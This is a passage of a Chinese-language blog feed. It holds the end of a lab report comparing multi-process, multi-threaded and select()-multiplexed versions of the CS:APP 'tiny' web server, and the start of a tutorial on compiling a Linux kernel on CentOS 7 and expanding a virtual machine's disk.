class="hljs-string">&quot;usage: %s &lt;port&gt;\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    listenfd = Open_listenfd(argv[<span class="hljs-number">1</span>]);<br>    <br>    <span class="hljs-comment">//原始模式 </span><br>    <span class="hljs-comment">/*while (1) &#123;</span><br><span class="hljs-comment">clientlen = sizeof(clientaddr);</span><br><span class="hljs-comment">connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen); //line:netp:tiny:accept</span><br><span class="hljs-comment">        Getnameinfo((SA *) &amp;clientaddr, clientlen, hostname, MAXLINE, </span><br><span class="hljs-comment">                    port, MAXLINE, 0);</span><br><span class="hljs-comment">        printf(&quot;Accepted connection from (%s, %s)\n&quot;, hostname, port);</span><br><span class="hljs-comment">doit(connfd);                                             //line:netp:tiny:doit</span><br><span class="hljs-comment">Close(connfd);                                            //line:netp:tiny:close</span><br><span class="hljs-comment">    &#125;*/</span><br> <br>    <span class="hljs-comment">//多线程 </span><br>    <span class="hljs-type">pthread_t</span> tid;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        clientlen = <span class="hljs-keyword">sizeof</span>(clientaddr);<br>        connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen);<br>            Getnameinfo((SA *) &amp;clientaddr, clientlen, hostname, MAXLINE, <br>                        port, MAXLINE, <span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Accepted connection from (%s, %s)\n&quot;</span>, hostname, port);<br>        Pthread_create(&amp;tid, <span class="hljs-literal">NULL</span>, thread, &amp;connfd);<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br> <br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">make<br>sudo ./tiny 6666<br></code></pre></td></tr></table></figure><p><img src="/images/os4-6.png"></p><p><img src="/images/os4-7.png"></p><h3 id="多路复用实现并发"><a href="#多路复用实现并发" class="headerlink" title="多路复用实现并发"></a>多路复用实现并发</h3><p>Fd_set rds,tmp定义两个文件描述符集，rds为用于监控的集合，tmp用于临时复制rds。FD_ZERO将rds清零，RD_SET将选定的位置1，fd_max是监听的套接字中最大的套接字描述符加一。<br>因为每次执行完select之后，未发生状态变化的套接字位会被置0，所以在循环开始时要对rds进行复制，对副本tmp进行select操作。select会把未就绪的描述符位置0，遍历文件描述符至fd_max，对每个文件描述符进行判断是否在文件描述符集tmp中，若在则进行处理。因为处理的都是就绪的套接字，所以不会发生阻塞。<br>如果为监听套接字就绪，新建立连接的描述符要加入rds中，如果为连接套接字，处理完之后要将其从文件描述符集rds中清除。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> <br>&#123;<br>    <span class="hljs-type">int</span> listenfd, connfd;<br>    <span class="hljs-type">char</span> hostname[MAXLINE], port[MAXLINE];<br>    <span class="hljs-type">socklen_t</span> clientlen;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_storage</span> <span class="hljs-title">clientaddr</span>;</span><br><br>    <br>    <span class="hljs-comment">/* Check command line args */</span><br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;usage: %s &lt;port&gt;\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    listenfd = Open_listenfd(argv[<span class="hljs-number">1</span>]);<br>    <br>    <span class="hljs-comment">//原始模式 </span><br>    <span class="hljs-comment">/*while (1) &#123;</span><br><span class="hljs-comment">clientlen = sizeof(clientaddr);</span><br><span class="hljs-comment">connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen); //line:netp:tiny:accept</span><br><span class="hljs-comment">        Getnameinfo((SA *) &amp;clientaddr, clientlen, hostname, MAXLINE, </span><br><span class="hljs-comment">                    port, MAXLINE, 0);</span><br><span class="hljs-comment">        printf(&quot;Accepted connection from (%s, %s)\n&quot;, hostname, port);</span><br><span class="hljs-comment">doit(connfd);                                             //line:netp:tiny:doit</span><br><span class="hljs-comment">Close(connfd);                                            //line:netp:tiny:close</span><br><span class="hljs-comment">    &#125;*/</span><br>    <span class="hljs-comment">//多路复用 </span><br>    fd_set rds, tmp;<br>    <span class="hljs-type">int</span> fd_max,i;<br>    FD_ZERO(&amp;rds);<br>    FD_SET(listenfd, &amp;rds);<br>    fd_max = listenfd + <span class="hljs-number">1</span>;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        tmp = rds;<br>        select(fd_max, &amp;tmp, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i&lt;fd_max; i++) &#123;<br>            <span class="hljs-keyword">if</span> (FD_ISSET(i, &amp;tmp)) &#123;<br>                <span class="hljs-keyword">if</span> (listenfd == i) &#123;<br>                    clientlen = <span class="hljs-keyword">sizeof</span>(clientaddr);<br>                    connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen);<br>                    FD_SET(connfd, &amp;rds);<br>                    <span class="hljs-keyword">if</span> (fd_max &lt;= connfd) fd_max = connfd+<span class="hljs-number">1</span>;<br><br>                    Getnameinfo((SA *) &amp;clientaddr, clientlen, hostname, MAXLINE, <br>                        port, MAXLINE, <span class="hljs-number">0</span>);<br>                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Accepted connection from (%s, %s)\n&quot;</span>, hostname, port);<br>                &#125;<br>                <span class="hljs-keyword">else</span> &#123;<br>                    doit(i);<br>                    FD_CLR(i, &amp;rds);<br>                    Close(i);<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br> <br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">make<br>sudo ./tiny 6666<br></code></pre></td></tr></table></figure><p><img src="/images/os4-6.png"></p><p><img src="/images/os4-7.png"></p><h2 id="实验结果分析"><a href="#实验结果分析" class="headerlink" title="实验结果分析"></a>实验结果分析</h2><p>使用进程最简单，因为每个进程互相独立，不影响主程序的稳定性，子进程崩溃没关系，每个子进程都有自己的地址空间和相关资源，总体能够达到的性能上限非常大，但是调度开销比较大。<br>多路复用编程复杂度高，但是由于多路复用是在单一进程的上下文中的，因此每个逻辑流程都能访问该进程的全部地址空间，所以开销比多进程低得多。<br>多线程每个线程都有自己的线程上下文，所有的运行在一个进程里的线程共享该进程的整个虚拟地址空间。由于线程运行在单一进程中，因此共享这个进程虚拟地址空间的整个内容，包括它的代码、数据、堆、共享库和打开的文件。优点是程序逻辑和控制方式简单，所有线程可以直接共享内存和变量等，耗的总资源比进程方式好。但是由于每个线程与主程序共用地址空间，地址空间受限，一个线程的崩溃也可能影响到整个程序的稳定性，性能提高也有限制。</p><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p>tiny.c修改的main函数部分代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *argv)</span><br>&#123;<br>    <span class="hljs-type">int</span> connfd = *((<span class="hljs-type">int</span> *)argv);<br>    Pthread_detach(pthread_self());<br>    doit(connfd);  <br>    Close(connfd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> <br>&#123;<br>    <span class="hljs-type">int</span> listenfd, connfd;<br>    <span class="hljs-type">char</span> hostname[MAXLINE], port[MAXLINE];<br>    <span class="hljs-type">socklen_t</span> clientlen;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_storage</span> <span class="hljs-title">clientaddr</span>;</span><br><br>    <br>    <span class="hljs-comment">/* Check command line args */</span><br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">2</span>) &#123;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;usage: %s &lt;port&gt;\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    listenfd = Open_listenfd(argv[<span class="hljs-number">1</span>]);<br>    <br>    <span class="hljs-comment">//原始模式 </span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>clientlen = <span class="hljs-keyword">sizeof</span>(clientaddr);<br>connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen); <span class="hljs-comment">//line:netp:tiny:accept</span><br>        Getnameinfo((SA *) &amp;clientaddr, clientlen, hostname, MAXLINE, <br>                    port, MAXLINE, <span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Accepted connection from (%s, %s)\n&quot;</span>, hostname, port);<br>doit(connfd);                                             <span class="hljs-comment">//line:netp:tiny:doit</span><br>Close(connfd);                                            <span class="hljs-comment">//line:netp:tiny:close</span><br>    &#125;<br>    <span class="hljs-comment">// 多进程 </span><br>    <span class="hljs-comment">/*while (1) &#123;</span><br><span class="hljs-comment">        clientlen = sizeof(clientaddr);</span><br><span class="hljs-comment">        connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen); </span><br><span class="hljs-comment">        if (Fork() == 0) &#123;</span><br><span class="hljs-comment">            Close(listenfd);</span><br><span class="hljs-comment">            Getnameinfo((SA *) &amp;clientaddr, clientlen, hostname, MAXLINE, </span><br><span class="hljs-comment">                        port, MAXLINE, 0);</span><br><span class="hljs-comment">            printf(&quot;Accepted connection from (%s, %s)\n&quot;, hostname, port);</span><br><span class="hljs-comment">            doit(connfd);</span><br><span class="hljs-comment">            Close(connfd);</span><br><span class="hljs-comment">            exit(0);</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">        Close(connfd);</span><br><span class="hljs-comment">    &#125;*/</span><br>    <span class="hljs-comment">//多路复用 </span><br>    <span class="hljs-comment">/* </span><br><span class="hljs-comment">    fd_set rds, tmp;</span><br><span class="hljs-comment">    int fd_max,i;</span><br><span class="hljs-comment">    FD_ZERO(&amp;rds);</span><br><span class="hljs-comment">    FD_SET(listenfd, &amp;rds);</span><br><span class="hljs-comment">    fd_max = listenfd + 1;</span><br><span class="hljs-comment">while (1) &#123;</span><br><span class="hljs-comment">        tmp = rds;</span><br><span class="hljs-comment">        select(fd_max, &amp;tmp, NULL, NULL, NULL);</span><br><span class="hljs-comment">        for (i=0; i&lt;fd_max; i++) &#123;</span><br><span class="hljs-comment">            if (FD_ISSET(i, &amp;tmp)) &#123;</span><br><span class="hljs-comment">                if (listenfd == i) &#123;</span><br><span class="hljs-comment">                    clientlen = sizeof(clientaddr);</span><br><span class="hljs-comment">                    connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen);</span><br><span class="hljs-comment">                    FD_SET(connfd, &amp;rds);</span><br><span class="hljs-comment">                    if (fd_max &lt;= connfd) fd_max = connfd+1;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">                    Getnameinfo((SA *) &amp;clientaddr, clientlen, hostname, MAXLINE, </span><br><span class="hljs-comment">                        port, MAXLINE, 0);</span><br><span class="hljs-comment">                    printf(&quot;Accepted connection from (%s, %s)\n&quot;, hostname, port);</span><br><span class="hljs-comment">                &#125;</span><br><span class="hljs-comment">                else &#123;</span><br><span class="hljs-comment">                    doit(i);</span><br><span class="hljs-comment">                    FD_CLR(i, &amp;rds);</span><br><span class="hljs-comment">                    Close(i);</span><br><span class="hljs-comment">                &#125;</span><br><span class="hljs-comment">            &#125;</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    &#125;*/</span> <br>    <span class="hljs-comment">//多线程 </span><br>    <br>    <span class="hljs-comment">/*pthread_t tid;</span><br><span class="hljs-comment">while (1) &#123;</span><br><span class="hljs-comment">        clientlen = sizeof(clientaddr);</span><br><span class="hljs-comment">        connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen);</span><br><span class="hljs-comment">            Getnameinfo((SA *) &amp;clientaddr, clientlen, hostname, MAXLINE, </span><br><span class="hljs-comment">                        port, MAXLINE, 0);</span><br><span class="hljs-comment">        printf(&quot;Accepted connection from (%s, %s)\n&quot;, hostname, port);</span><br><span class="hljs-comment">        Pthread_create(&amp;tid, NULL, thread, &amp;connfd);</span><br><span class="hljs-comment">    &#125;*/</span><br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br> <br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>网络编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux内核编译与系统调用</title>
    <link href="/blog/2019/10/21/Linux%E5%86%85%E6%A0%B8%E7%BC%96%E8%AF%91%E4%B8%8E%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/"/>
    <url>/blog/2019/10/21/Linux%E5%86%85%E6%A0%B8%E7%BC%96%E8%AF%91%E4%B8%8E%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><strong>今天尝试一下人生中第一次编译Linux内核，遇到了几个问题，也收获了很多技能，总的来说还是很有意义的。</strong></p><p><img src="/images/fj23.jpg"></p><span id="more"></span><h2 id="Linux体系结构简介"><a href="#Linux体系结构简介" class="headerlink" title="Linux体系结构简介"></a>Linux体系结构简介</h2><h3 id="Linux体系结构"><a href="#Linux体系结构" class="headerlink" title="Linux体系结构"></a>Linux体系结构</h3><p>Linux可以分为两部分，分别为用户空间和内核空间具体如下图：</p><p><img src="/images/linux-k1.png"></p><p>1)<strong>用户空间包括</strong>：用户的应用程序、C库</p><p>2)<strong>内核空间包括</strong>：系统调用接口、内核（狭义的）、平台架构相关的代码</p><h3 id="Linux内核结构（广义内核）"><a href="#Linux内核结构（广义内核）" class="headerlink" title="Linux内核结构（广义内核）"></a>Linux内核结构（广义内核）</h3><p>Linux内核由七个部分构成，具体如下图所示：</p><p><img src="/images/linux-k2.png"></p><p>a)        <strong>系统调用接口（SCI）</strong>：open、read、write等系统调用<br>b)        <strong>进程管理（PM）</strong>：创建进程、删除进程、调度进程等<br>c)        <strong>内存管理（MM）</strong>：内存分配、管理等<br>d)        <strong>虚拟文件系统（VFS）</strong>：为多种文件系统提供统一的操作接口<br>e)        <strong>网络协议栈</strong>：提供各种网络协议<br>f)         <strong>CPU架构相关代码（Arch）</strong>：为的是提高至移植性<br>g)        <strong>设备驱动程序（DD）</strong>：各种设备驱动，占到内核的70%左右代码</p><h2 id="Linux内核源码简介"><a href="#Linux内核源码简介" class="headerlink" title="Linux内核源码简介"></a>Linux内核源码简介</h2><h3 id="源码获取"><a href="#源码获取" class="headerlink" title="源码获取"></a>源码获取</h3><p>可以从官网直接下载：<a href="https://www.kernel.org/">https://www.kernel.org/</a></p><h3 id="源码目录简介"><a href="#源码目录简介" class="headerlink" title="源码目录简介"></a>源码目录简介</h3><p>其源码主要有以下目录（介绍重要目录）：<br>a)        <strong>Arch目录：</strong>存放处理器相关的代码。下设子目录，分别对应具体的CPU，每个子目录有boot，mm，以及kernel三个子目录，分别对应系统引导以及存储管理，和系统调用<br>b)        <strong>Include目录</strong>：内核所需要的大部分头文件目录。与平台无关的在include&#x2F;linux子目录下，与平台相关的则放在include相应的子目录中。<br>c)        <strong>fs目录：</strong>存放各种文件系统的实现代码。<br>d)        <strong>init目录：</strong>init子目录包含核心的初始化代码（不是系统的引导代码）。其包含两个文件main.c和version.c，可以用来研究核心如何工作。<br>e)        <strong>ipc目录：</strong>包含核心进程间的通信代码。<br>f)         <strong>kernel目录：</strong>包含内核管理的核心代码。与硬件相关代码放在arch&#x2F;*&#x2F;kernel目录下。<br>g)        <strong>mm目录：</strong>包含了所有的内存管理代码。与硬件相关的内存管理代码位于arch&#x2F;*&#x2F;mm目录下。<br>h)        <strong>scripts目录：</strong>包含用于配置核心的脚本文件。<br>i)          <strong>lib目录：</strong>包含了核心的库代码，与硬件相关的库代码被放在arch&#x2F;*&#x2F;lib&#x2F;目录下</p><h2 id="Linux内核编译（CentOS-7）"><a href="#Linux内核编译（CentOS-7）" class="headerlink" title="Linux内核编译（CentOS 7）"></a>Linux内核编译（CentOS 7）</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p><strong>安装所需的软件包：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo yum update<br>sudo yum install -y ncurses-devel make gcc bc bison flex elfutils-libelf-devel openssl-devel grub2<br></code></pre></td></tr></table></figure><p><strong>下载内核源码：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.17.11.tar.xz<br></code></pre></td></tr></table></figure><p>这里我用的是内核的4.17.11版本。</p><p><strong>解压缩到当前目录：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar -xf linux-4.17.11.tar.xz<br></code></pre></td></tr></table></figure><p><strong>重用当前系统内核的配置：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> -v /boot/config-3.10.0-693.el7.x86_64 .config<br></code></pre></td></tr></table></figure><p>然后我们就可以使用make menuconfig开启菜单了，随后即可自由配置所需的内核模块：</p><p><img src="/images/linux-k3.png"></p><p>配置完config之后，保存并退出。</p><h3 id="虚拟机增加磁盘容量"><a href="#虚拟机增加磁盘容量" class="headerlink" title="虚拟机增加磁盘容量"></a>虚拟机增加磁盘容量</h3><p><strong>如果你的虚拟机磁盘容量大于30GB请直接跳过这部分！</strong></p><p>由于当时安装虚拟机时没考虑去用它编译内核，因此虚拟机磁盘容量只有20GB，然后内核编译过程中就会出错，因为磁盘容量不足，因此这里说一下如何给CentOS 7虚拟机磁盘扩容。</p><h4 id="1-VMware扩展磁盘"><a href="#1-VMware扩展磁盘" class="headerlink" title="1. VMware扩展磁盘"></a>1. VMware扩展磁盘</h4><p>首先将虚拟机关机，在虚拟机上点击右键，设置，点硬盘，扩展，我这里设置的是40G，如果主机硬盘够大可以多设置一些，然后点击扩展，随后启动虚拟机。</p><p><img src="/images/linux-k4.png"></p><h4 id="2-CentOS中扩展"><a href="#2-CentOS中扩展" class="headerlink" title="2. CentOS中扩展"></a>2. CentOS中扩展</h4><p><strong>首先查看系统的磁盘情况：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo fdisk -l<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">[admin@localhost ~]$ sudo fdisk -l<br>[sudo] password <span class="hljs-keyword">for</span> admin: <br><br>Disk /dev/sda: 42.9 GB, 42949672960 bytes, 83886080 sectors<br>Units = sectors of 1 * 512 = 512 bytes<br>Sector size (logical/physical): 512 bytes / 512 bytes<br>I/O size (minimum/optimal): 512 bytes / 512 bytes<br>Disk label <span class="hljs-built_in">type</span>: dos<br>Disk identifier: 0x0009003d<br><br>   Device Boot      Start         End      Blocks   Id  System<br>/dev/sda1   *        2048     2099199     1048576   83  Linux<br>/dev/sda2         2099200    41943039    19921920   8e  Linux LVM<br>/dev/sda3        41943040    83886079    20971520   83  Linux<br><br>Disk /dev/mapper/centos-root: 39.6 GB, 39619395584 bytes, 77381632 sectors<br>Units = sectors of 1 * 512 = 512 bytes<br>Sector size (logical/physical): 512 bytes / 512 bytes<br>I/O size (minimum/optimal): 512 bytes / 512 bytes<br><br><br>Disk /dev/mapper/centos-swap: 2147 MB, 2147483648 bytes, 4194304 sectors<br>Units = sectors of 1 * 512 = 512 bytes<br>Sector size (logical/physical): 512 bytes / 512 bytes<br>I/O size (minimum/optimal): 512 bytes / 512 bytes<br><br></code></pre></td></tr></table></figure><p>分区情况如上所示。</p><p><strong>然后创建新的分区sda3：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo fdisk /dev/sda<br></code></pre></td></tr></table></figure><p>然后根据提示创建分区：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">Command (m <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>): n   <span class="hljs-comment"># 输入 n 表示创建新分区</span><br>Command action<br>   e   extended<br>   p   primary partition (1-4)<br>p<br>Partition number (1-4): 3   <span class="hljs-comment"># 输入 3 表示sda3，因为前面已经有两个了</span><br>First cylinder (1306-4568, default 1306):     <span class="hljs-comment"># 回车，按默认值</span><br>Using default value 1306<br>Last cylinder, +cylinders or +size&#123;K,M,G&#125; (1306-4568, default 4568):   <span class="hljs-comment"># 回车，按默认值</span><br>Using default value 4568<br><br>Command (m <span class="hljs-keyword">for</span> <span class="hljs-built_in">help</span>): w     <span class="hljs-comment"># 输入 w 保存退出 </span><br>The partition table has been altered!<br></code></pre></td></tr></table></figure><p><strong>再次查看分区情况：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo fdisk -l<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">Disk /dev/sda: 42.9 GB, 42949672960 bytes, 83886080 sectors<br>Units = sectors of 1 * 512 = 512 bytes<br>Sector size (logical/physical): 512 bytes / 512 bytes<br>I/O size (minimum/optimal): 512 bytes / 512 bytes<br>Disk label <span class="hljs-built_in">type</span>: dos<br>Disk identifier: 0x0009003d<br><br>   Device Boot      Start         End      Blocks   Id  System<br>/dev/sda1   *        2048     2099199     1048576   83  Linux<br>/dev/sda2         2099200    41943039    19921920   8e  Linux LVM<br>/dev/sda3        41943040    83886079    20971520   83  Linux<br><br>Disk /dev/mapper/centos-root: 39.6 GB, 39619395584 bytes, 77381632 sectors<br>Units = sectors of 1 * 512 = 512 bytes<br>Sector size (logical/physical): 512 bytes / 512 bytes<br>I/O size (minimum/optimal): 512 bytes / 512 bytes<br><br><br>Disk /dev/mapper/centos-swap: 2147 MB, 2147483648 bytes, 4194304 sectors<br>Units = sectors of 1 * 512 = 512 bytes<br>Sector size (logical/physical): 512 bytes / 512 bytes<br>I/O size (minimum/optimal): 512 bytes / 512 bytes<br><br></code></pre></td></tr></table></figure><p>分区已经变成3个了，但是还没有挂载，还不能使用。</p><p><strong>重启操作系统：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo reboot<br></code></pre></td></tr></table></figure><p><strong>格式化新的分区为ext3文件系统：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo mkfs -t ext3 /dev/sda3<br></code></pre></td></tr></table></figure><p><strong>将物理硬盘分区初始化为物理卷：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo pvcreate /dev/sda3<br></code></pre></td></tr></table></figure><p><strong>向卷组中添加物理卷来增加卷组的容量：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">[admin@localhost ~]$ sudo <span class="hljs-built_in">df</span> -h<br>Filesystem               Size  Used Avail Use% Mounted on<br>devtmpfs           